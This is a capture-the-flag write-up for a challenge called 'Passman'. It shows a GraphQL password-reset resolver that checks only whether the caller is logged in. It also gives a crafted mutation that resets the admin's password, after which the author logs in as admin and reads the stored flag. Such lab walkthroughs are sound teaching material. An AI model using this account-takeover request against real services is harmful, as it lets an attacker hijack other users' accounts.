# Passman (easy)
In this challenge we will work with graphql and attack lack of input validation.

When opening the website we will see a login page.
This time there's also the option to create a user, so let's do that.

Logging in to the website we can use the password manager and add password.

Through this we inspect what a **muatation query** looks like:

```json
{
  "query": "mutation($recType: String!, $recAddr: String!, $recUser: String!, $recPass: String!, $recNote: String!) { AddPhrase(recType: $recType, recAddr: $recAddr, recUser: $recUser, recPass: $recPass, recNote: $recNote) { message } }",
  "variables": {
    "recType": "Web",
    "recAddr": "asd",
    "recUser": "asd",
    "recPass": "asd",
    "recNote": "asd"
  }
}
```

We see that **mutation** is used for queries that add/update information.
We see that this lists the types of variables first, and then inside the curly braces constructs the object to be added, and then inside another set of braces declares the result we get back.

Then we declare all of our variables and set their values.

Now we turn our attention to the `helpers/GraphqlHelper.js` file.
Here we have all types of graphql requests that we can make, however one stands out:

```javascript
UpdatePassword: {
    type: ResponseType,
    args: {
        username: { type: new GraphQLNonNull(GraphQLString) },
        password: { type: new GraphQLNonNull(GraphQLString) }
    },
    resolve: async (root, args, request) => {
        return new Promise((resolve, reject) => {
            if (!request.user) return reject(new GraphQLError('Authentication required!'));

            db.updatePassword(args.username, args.password)
                .then(() => resolve(response("Password updated successfully!")))
                .catch(err => reject(new GraphQLError(err)));
        });
    }
},
```

Here we see that we can send a request to update passwords of users.

The function checks if we are logged in, but allows to update the password of any other user, therefore our attack will go as follows:
1. Create any user
2. Authenticate as that user to get a session
3. Send a request to the `UpdatePassword` function to change the admin password
4. Login as admin

I crafted the following graphql request to update the password of the admin user

```json
{
  "query": "mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message } }",
  "variables": {
    "username": "admin",
    "password": "pwned"
  }
}
```

After this we log in as admin, and unhide the only password that is stored, and that is our flag.
